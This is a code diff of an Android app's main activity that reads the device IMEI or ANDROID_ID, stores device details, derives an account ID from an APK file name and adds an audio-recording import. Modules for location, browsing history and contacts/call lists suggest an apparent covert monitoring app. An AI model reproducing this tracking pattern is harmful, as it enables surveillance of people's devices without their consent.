@@ -16,19 +16,17 @@ import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
+import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.view.Menu;
-import android.view.Window;
 import android.widget.Button;
 import android.widget.EditText;
 
+import com.inet.android.audio.RecordAudio;
 import com.inet.android.certificate.R;
 import com.inet.android.history.LinkService;
-import com.inet.android.list.ListApp;
-import com.inet.android.list.ListCall;
-import com.inet.android.list.ListContacts;
 import com.inet.android.location.LocationTracker;
 import com.inet.android.request.Request4;
 import com.inet.android.utils.Logging;
@@ -53,6 +51,7 @@ public class MainActivity extends Activity {
 	File root;
 	File[] fileArray;
 	private String sID;
+	String imeistring;
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
@@ -65,25 +64,23 @@ public class MainActivity extends Activity {
 		sp = PreferenceManager.getDefaultSharedPreferences(context);
 		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String androidVersion = android.os.Build.VERSION.RELEASE;
 		aboutDev = " Model: " + model + " Version android: " + androidVersion;
 		e = sp.edit();
 		e.putString("BUILD", "V_000.1");
+		if (manager.getDeviceId() != null) {
+			imeistring = manager.getDeviceId(); // *** use for mobiles
+		} else {
+			imeistring = Secure.getString(getApplicationContext()
+					.getContentResolver(), Secure.ANDROID_ID); // *** use for
+																// tablets
+		}
 		e.putString("imei", imeistring);
 		e.putString("ABOUT", aboutDev);
 		e.putString("model", model);
 		e.putString("account", "account");
-		// ListApp listApp = new ListApp();
-		// listApp.getListOfInstalledApp(context);
-//		 GetContacts getCont = new GetContacts();
-//		 getCont.execute(context);
-//		ArchiveCall arhCall = new ArchiveCall();
-//		arhCall.execute(context);
-
 		e.commit();
-
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 		boolean getInfo = sp.getBoolean("getInfo", false);
 		if (!hasVisited) {
@@ -221,8 +218,8 @@ public class MainActivity extends Activity {
 					}
 				}
 
-				if (sID.indexOf("bb.apk") != -1) {
-					ID = sID.substring(0, sID.indexOf("b"));
+				if (sID.indexOf("fg.apk") != -1) {
+					ID = sID.substring(0, sID.indexOf("f"));
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
